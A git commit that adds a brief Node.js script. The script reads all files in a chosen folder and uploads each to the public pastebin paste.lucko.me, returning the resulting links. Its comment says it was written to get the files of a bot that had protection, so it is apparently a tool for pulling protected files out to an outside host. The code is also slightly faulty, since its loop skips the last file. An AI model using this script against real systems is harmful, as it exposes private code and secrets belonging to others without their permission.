3589d98fcd7a8bc648e26794bd2b6ee48891a40b
tailsjs <49571184+tailsjs@users.noreply.github.com>
2020-09-23 22:55:18 +0300

    sometin'

---
+++ parser_file_content_to_pastelucko.js
@@ -0,0 +1,21 @@
+/*
+** Parser the content of the file with subsequent upload to paste.lucko.me
+**
+** We needed to get the files of a bot that had protection.
+** Fun fact: The code is written on the knee.
+*/
+
+
+let links = []; 
+let folder = './HERE_YOUR_WAY'; 
+const fetch = require("node-fetch"); 
+const fs = require('fs'); 
+const cmds = fs.readdirSync(folder); 
+for(let i = 0; i < cmds.length - 1; i++){ 
+let req = (await (await fetch('https://paste.lucko.me/documents', { 
+method: "POST", 
+body: fs.readFileSync(folder + "/" + cmds[i], 'utf8') 
+})).json()); 
+links.push({name: cmds[i], url: 'https://paste.lucko.me/' + req.key }); 
+} 
+return JSON.stringify(links, null, '\t');
